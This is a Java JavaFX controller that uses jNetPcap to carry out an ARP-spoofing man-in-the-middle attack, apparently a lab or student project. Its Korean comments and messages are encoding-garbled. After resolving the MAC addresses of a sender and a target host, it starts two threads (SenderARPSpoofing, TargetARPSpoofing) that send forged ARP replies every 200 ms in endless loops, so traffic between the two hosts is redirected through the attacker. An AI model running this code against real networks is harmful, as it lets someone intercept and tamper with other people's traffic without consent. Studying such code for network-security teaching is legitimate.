package controller;

import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.protocol.lan.Ethernet;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Util;

public class Controller implements Initializable{

	@FXML
	private ListView<String> networkListView;
	
	@FXML
	private TextArea textArea;
	
	@FXML
	private Button pickButton;
	
	@FXML
	private TextField myIp;
	
	@FXML
	private TextField senderIp;
	
	@FXML
	private TextField targetIp;
	
	@FXML
	private Button getMacButton;
	
	ObservableList<String> networkList = FXCollections.observableArrayList();
	
	private ArrayList<PcapIf> allDevs = null;
	
	@Override
	public void initialize(URL location, ResourceBundle resource) {
		allDevs = new ArrayList<PcapIf>();
		StringBuilder errbuf = new StringBuilder();
		int r = Pcap.findAllDevs(allDevs, errbuf);
		if(r==Pcap.NOT_OK || allDevs.isEmpty()) {
			textArea.appendText("��Ʈ��ũ ��ġ�� ã�� �� ����.\n" + errbuf.toString() + "\n");
			return;
		}
		
		textArea.appendText("��Ʈ��ũ ��ġ �߰�.\n���ϴ� ��ġ�� �����ϼ���.\n");
		for(PcapIf device : allDevs) {
			networkList.add(device.getName() + " " +
					((device.getDescription() != null) ? device.getDescription() : "�������."));
		}
		networkListView.setItems(networkList);
	}
	
	public void networkPickAction() {
		if(networkListView.getSelectionModel().getSelectedIndex() < 0)
			return;
		
		Main.device = allDevs.get(networkListView.getSelectionModel().getSelectedIndex());
		networkListView.setDisable(true);
		pickButton.setDisable(true);
		
		int snaplen = 64 * 1024;
		int flags = Pcap.MODE_PROMISCUOUS;
		int timeout = 1;
		
		StringBuilder errbuf = new StringBuilder();
		Main.pcap = Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf);
		
		if(Main.pcap == null) {
			textArea.appendText("��Ʈ��ũ ��ġ�� �� �� ����. \n" + errbuf.toString() + "\n");
			return;
		}
		textArea.appendText("��ġ���� : " + Main.device.getName() + "\n");
		textArea.appendText("��Ʈ��ũ ��ġ�� Ȱ��ȭ�߽��ϴ�.\n");
	}
	
	public void getMacAction() //start ��ư�� ������ �� Mac�ּҸ� �������� ����
	{
		if(!pickButton.isDisable()) {
			textArea.appendText("��Ʈ��ũ ��ġ�� ���� �������ּ���.\n");
			return;
		}
		
		ARP arp = new ARP(); // ������ ARP ���̺귯�� ���
		Ethernet eth = new Ethernet();
		PcapHeader header = new PcapHeader(JMemory.POINTER); // ĸó�� ��Ŷ�� ����κи� ���
		JBuffer buf = new JBuffer(JMemory.POINTER);
		ByteBuffer buffer = null; 
		
		int id = JRegistry.mapDLTToId(Main.pcap.datalink());
		
		try {
			Main.myMac = Main.device.getHardwareAddress(); // �ڽ��� �ϵ���� ������ �����
			Main.myIp = InetAddress.getByName(myIp.getText()).getAddress(); // textField�� ���� ip�� ip�ּ� ���·� ��ȯ���Ѽ� myIp�� ��´�.
			Main.senderIp = InetAddress.getByName(senderIp.getText()).getAddress(); // Main���� ������ senderIp ������ �ּ� �ֱ�
			Main.targetIp = InetAddress.getByName(targetIp.getText()).getAddress(); // Main���� ������ targetIp ������ �ּ� �ֱ�
		}catch(Exception e)
		{
			textArea.appendText("IP�ּҰ� ���� ����.\n");
			return;
		}
		
		myIp.setDisable(true);
		senderIp.setDisable(true);
		targetIp.setDisable(true);
		getMacButton.setDisable(true);
		
		arp = new ARP();
		arp.makeARPrequest(Main.myMac, Main.myIp, Main.targetIp); // ARP request ��Ŷ ����
		buffer = ByteBuffer.wrap(arp.getPacket()); // ���ۿ� arp ��Ŷ�� ��� ������ ����
		if(Main.pcap.sendPacket(buffer) != Pcap.OK) // ��Ŷ��  ��� ������ ������ �ִٸ�..
		{
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("Ÿ�꿡�� ARP request�� ����.\n" + 
				Util.bytesToString(arp.getPacket()) + "\n"); // �ڽ��� ���� arp request ��Ŷ�� ���.
		
		
		long targetStartTime = System.currentTimeMillis();
		Main.targetMac = new byte[6];
		while(Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) // ��Ŷ�� ����� ������ �˻�
		{
			if(System.currentTimeMillis() - targetStartTime >= 500) 
			{
				textArea.appendText("Ÿ���� �������� �ʽ��ϴ�.");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf);
			packet.scan(id);
			byte[] sourceIp = new byte[4];
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIp, 0, 4); // 28��° ����Ʈ���� 4���� ����Ʈ�� �����Ͽ� ��Ŷ�����ŭ�� ũ�⿡ �־���
			if(packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06
					&& packet.getByte(20)== 0x00 && packet.getByte(21) == 0x02
					&& Util.bytesToString(sourceIp).equals(Util.bytesToString(Main.targetIp))
					&& packet.hasHeader(eth)) // ARP�� 0806, reply�� 0002, ip�ּҰ� ��ġ�ϴ��� 2�������� Ȯ��
			{
				Main.targetMac = eth.source(); // ���� �� �ּҸ� targetMac �ּҿ� �ִ´�.
				break;
			} else {
				continue;
			}
		}
		
		textArea.appendText("Ÿ�� �� �ּ� : " + 
				Util.bytesToString(Main.targetMac) + "\n");
		
		arp = new ARP();
		arp.makeARPrequest(Main.myMac, Main.myIp, Main.senderIp);
		buffer = ByteBuffer.wrap(arp.getPacket());
		if(Main.pcap.sendPacket(buffer) != Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("sender���� ARP request�� ����.\n" + 
				Util.bytesToString(arp.getPacket()) + "\n");
		
		long senderStartTime = System.currentTimeMillis();
		Main.senderMac = new byte[6];
		while(Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
			if(System.currentTimeMillis() - senderStartTime >= 500) {
				textArea.appendText("Ÿ���� �������� �ʽ��ϴ�.");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf);
			packet.scan(id);
			byte[] sourceIp = new byte[4];
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIp, 0, 4);
			if(packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06
					&& packet.getByte(20)== 0x00 && packet.getByte(21) == 0x02
					&& Util.bytesToString(sourceIp).equals(Util.bytesToString(Main.senderIp))
					&& packet.hasHeader(eth)) {
				Main.senderMac = eth.source(); // ���� �� �ּҸ� targetMac �ּҿ� �ִ´�.
				break;
			} else {
				continue;
			}
		}
		
		textArea.appendText("sender �� �ּ� : " + 
				Util.bytesToString(Main.senderMac) + "\n");
		
		new SenderARPSpoofing().start();
		new TargetARPSpoofing().start();
	}
	
	class SenderARPSpoofing extends Thread {
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.senderMac, Main.myMac, Main.myMac, 
					Main.targetIp, Main.senderMac, Main.senderIp);
			
			Platform.runLater(() -> {
				textArea.appendText("���Ϳ��� ARP Reply ��Ŷ�� ��� ����.\n");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				}catch(Exception e)
				{
					e.printStackTrace();
				}
			}
		}
	}
	
	class TargetARPSpoofing extends Thread {
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.targetMac, Main.myMac, Main.myMac, 
					Main.senderIp, Main.targetMac, Main.targetIp);
			
			Platform.runLater(() -> {
				textArea.appendText("Ÿ�꿡�� ARP Reply ��Ŷ�� ��� ����.\n");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				}catch(Exception e)
				{
					e.printStackTrace();
				}
			}
		}
	}
}
